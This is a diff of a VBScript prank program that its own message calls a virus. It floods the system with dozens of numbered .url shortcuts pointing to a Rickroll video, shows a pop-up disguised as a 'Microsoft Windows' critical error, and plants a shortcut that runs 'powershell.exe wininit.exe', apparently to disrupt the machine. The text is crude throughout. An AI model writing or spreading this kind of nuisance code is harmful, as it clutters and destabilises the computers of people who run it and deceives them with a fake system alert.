@@ -727,39 +727,39 @@ oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
 oUrlLink.Save
 
 Set oUrlLink = WshShell.CreateShortcut("FUCKED178.url")
-oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
+oUrlLink.TargetPath = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 oUrlLink.Save
 
 Set oUrlLink = WshShell.CreateShortcut("FUCKED179.url")
-oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
+oUrlLink.TargetPath = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 oUrlLink.Save
 
 Set oUrlLink = WshShell.CreateShortcut("FUCKED180.url")
-oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
+oUrlLink.TargetPath = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 oUrlLink.Save
 
 Set oUrlLink = WshShell.CreateShortcut("FUCKED181.url")
-oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
+oUrlLink.TargetPath = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 oUrlLink.Save
 
 Set oUrlLink = WshShell.CreateShortcut("FUCKED182.url")
-oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
+oUrlLink.TargetPath = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 oUrlLink.Save
 
 Set oUrlLink = WshShell.CreateShortcut("FUCKED183.url")
-oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
+oUrlLink.TargetPath = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 oUrlLink.Save
 
 Set oUrlLink = WshShell.CreateShortcut("FUCKED184.url")
-oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
+oUrlLink.TargetPath = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 oUrlLink.Save
 
 Set oUrlLink = WshShell.CreateShortcut("FUCKED185.url")
-oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
+oUrlLink.TargetPath = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 oUrlLink.Save
 
 Set oUrlLink = WshShell.CreateShortcut("FUCKED186.url")
-oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
+oUrlLink.TargetPath = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 oUrlLink.Save
 
 Set oUrlLink = WshShell.CreateShortcut("FUCKED187.url")
@@ -818,7 +818,7 @@ Set oUrlLink = WshShell.CreateShortcut("FUCKED200.url")
 oUrlLink.TargetPath = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 oUrlLink.Save
 
-X=MsgBox("Well isn't this great. You came across my shitty virus I made under 15 minutes. Are you that gullible? At least look at the code of the shit you're downloading.. Well. Looks like your fucked now!", 0+16, "Microsoft Windows")
+X=MsgBox("Your computer is now destroyed by Rickroll. That's ridiculous", 0+16, "Microsoft Windows")
 
 Set oUrlLink = WshShell.CreateShortcut("youaresusguys.lnk")
 oUrlLink.TargetPath = "powershell.exe wininit.exe"
